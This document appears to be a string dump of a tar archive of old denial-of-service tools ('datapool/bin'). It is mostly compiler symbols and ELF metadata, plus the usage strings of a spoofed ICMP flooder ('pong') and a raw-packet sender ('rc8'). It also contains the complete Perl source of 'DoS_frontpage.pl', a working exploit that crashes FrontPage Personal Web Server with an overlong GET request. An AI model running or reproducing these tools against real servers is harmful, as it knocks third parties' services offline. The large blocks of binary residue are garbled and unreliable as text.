            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "killwin.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "strcmp@@GLIBC_2.0",
            "usage",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "parse_args",
            "hits",
            "_start",
            "strlen@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "sockdesc",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "send@@GLIBC_2.0",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "port",
            "__data_start",
            "socket@@GLIBC_2.0",
            "target",
            "__gmon_start__",
            "datapool/bin/pong",
            "0100755",
            "0000000",
            "0000000",
            "00000041521",
            "07100656662",
            "013034",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "random",
            "memcpy",
            "perror",
            "optarg",
            "strtoul",
            "socket",
            "fflush",
            "bzero",
            "fprintf",
            "__deregister_frame_info",
            "optind",
            "sendto",
            "bcopy",
            "getopt",
            "memset",
            "inet_ntoa",
            "gethostbyname",
            "stderr",
            "htons",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh",
            "E1fE",
            "fE1fu",
            "e[^]",
            "t&hn",
            "WVS}",
            ")+f\u01c5f)\u028bQ",
            "81fR",
            " \u01c5\u06c1v",
            "8PPW ",
            "x[^_]",
            "PEPK",
            "\u028bE)\u0409",
            "Uu'h",
            "E5t&",
            "iE@E",
            "\u028bE)\u0409",
            "Uu'h",
            "\u0403;u[]",
            "pong %s - by FA-Q",
            "usage: %s [-fV] [-c count] [-i wait] [-s packetsize] <target> <broadcast>",
            "%s will not resolve",
            "dest address",
            "spoof address",
            "attacking (%s) from (%s)",
            "fc:s:i:V",
            "%s is an invalid number '%s'.",
            "%s is a bad packet size '%s'",
            "%s is a bad wait time '%s'",
            "%s error sending packet",
            "sending... packet limit set",
            "complete, %u packets sent",
            "flooding, (. == 25 packets)",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "pong.c",
            "resolve_one",
            "resolve_all",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "version",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "spoof_addr",
            "dest_name",
            "resolve",
            "bcopy@@GLIBC_2.0",
            "dest_addr",
            "inet_ntoa@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "pingsize",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "parse_args",
            "stdout@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "getopt@@GLIBC_2.0",
            "icmp_echo_send",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "spoofaddr",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "pingnmbr",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "give_info",
            "flood",
            "htons@@GLIBC_2.0",
            "strtoul@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "destaddr",
            "optarg@@GLIBC_2.0",
            "_IO_stdin_used",
            "addr_to_ulong",
            "spoof_name",
            "__data_start",
            "socket@@GLIBC_2.0",
            "pingsleep",
            "optind@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/rc8",
            "0100755",
            "0000000",
            "0000000",
            "00000032640",
            "07100656667",
            "012574",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "perror",
            "socket",
            "fflush",
            "fprintf",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "bcopy",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh\u0109",
            "UPWVE",
            "fE\u0603j",
            "E}u\"h*",
            "EP }",
            "E;E|",
            "j&EPEP2 u",
            "E\ub243EPhd",
            "e^_]",
            "\u0403;u[]",
            "12345678900.8",
            "Rythem Collision [v%s] -- Coded, Nso",
            "usage: rc <from host> <to host> <how many>",
            "The source hostname _must_ be real.",
            "The destination hostname does not exist.n",
            "socket",
            "IP_HDRINCL: found!",
            "setsockopt IP_HDRINCL",
            "sendto",
            "number of packets sent: %d",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "rc8.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/DoS_frontpage.pl",
            "0100755",
            "0000000",
            "0000000",
            "00000001762",
            "06772113662",
            "015242",
            "ustar  ",
            "root",
            "root",
            "#!/usr/bin/perl",
            "########################################################",
            "# FrontPage-PWS32/3.0.2.926 DoS By Narr0w.",
            "\t\t\t\t\t\t\t#",
            "# Greetz to: STAR-W0RMS & Legion2000 Group",
            "# Big FUCK to the channel #hacking @EFNET.........\t#",
            "#########################################################",
            "use IO::Socket;",
            "if(@ARGV < 1) { die \"\\nUsage: $0 <host>\\n\\n\"; }",
            "$len=length($ARGV[0]);",
            "if($len >= 64) { die \"\\nError: Host Length Too Long ($len)...\\n\"; }",
            "$host = @ARGV[0];",
            "print \"Connecting to $host...\\t\";",
            "$socket = IO::Socket::INET->new(PeerAddr => $host,PeerPort => 80,Proto => \"TCP\") || die \"[FAILED]\\n\";",
            "print \"[  OK  ]\\n\";",
            "print \"Sending x's...\\t\\t\";",
            "print $socket \"GET /\" . \"x\"x167 . \" HTTP/1.0\\n\\n\";",
            "print \"\\t[  OK  ]\\n\";",
            "print \"Checking...\\t\\t\\t\";",
            "sleep(5);",
            "while(<$socket>) {",
            "chop;",
            "if(/404 Not Found/) {",
            "\tprint \"[FAILED]\\n\";",
            "\tprint \"\\nThis DoS does not work on this server ($host) ...\\n\";",
            "\tclose $socket;",
            "\texit(0);",
            "else",
            "\tprint \"[  OK  ]\\n\";",
            "\tclose $socket;",
            "exit;",
            "datapool/bin/wingatecrash",
            "0100755",
            "0000000",
            "0000000",
            "00000033205",
            "07100656733",
            "014547",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "connect",
            "memcpy",
            "perror",
            "socket",
            "fflush",
            "bzero",
            "write",
            "inet_addr",
            "__deregister_frame_info",
            "gethostbyname",
            "htons",
            "exit",
            "atoi",
            "_IO_putc",
            "_IO_stdin_used",
            "__libc_start_main",
